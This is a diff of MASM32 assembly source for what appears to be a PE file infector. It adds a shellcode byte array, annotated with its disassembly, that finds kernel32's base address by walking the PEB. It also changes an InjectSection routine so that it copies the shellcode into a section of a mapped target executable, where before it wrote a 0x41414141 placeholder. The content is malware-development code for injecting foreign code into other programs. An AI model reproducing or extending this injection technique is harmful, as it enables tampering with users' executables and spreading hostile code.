@@ -51,6 +51,22 @@ includelib C:\masm32\lib\masm32.lib
 	imgEntryPoint	dd		0
 	sectionsHeader	dd		0
 
+	;
+	;
+	;  	===== Get Kernel32 base =====
+	;	push esi
+	;	xor eax, eax
+	;	mov eax, fs:[eax + 0x30]
+	;	mov eax, [eax + 0x0c]
+	;	mov eax, [eax + 0x14]
+	;	mov eax, [eax]
+	;	mov eax, [eax]
+	;	mov eax, [eax + 0x10]
+	
+	
+	code			db 056h, 031h, 0C0h, 064h, 08Bh, 040h, 030h, 08Bh,
+					040h, 00Ch, 08Bh, 040h, 014h, 08Bh, 000h, 08Bh,
+					000h, 08Bh, 040h, 010h, 0h
 ;
 ; Struct url
 ;
@@ -283,8 +299,8 @@ InjectSection proc lastSection:DWORD
 	mov edx, targetSection
 	mov ebx, mappedAddr
 	add edx, ebx
-	mov DWORD PTR [edx], 41414141h
-	;invoke MemCopy, ADDR code, edx, 14h
+	;mov DWORD PTR [edx], 41414141h
+	invoke MemCopy, ADDR code, edx, 14h
 	;mov DWORD ptr [edx], ebx
 	
 	
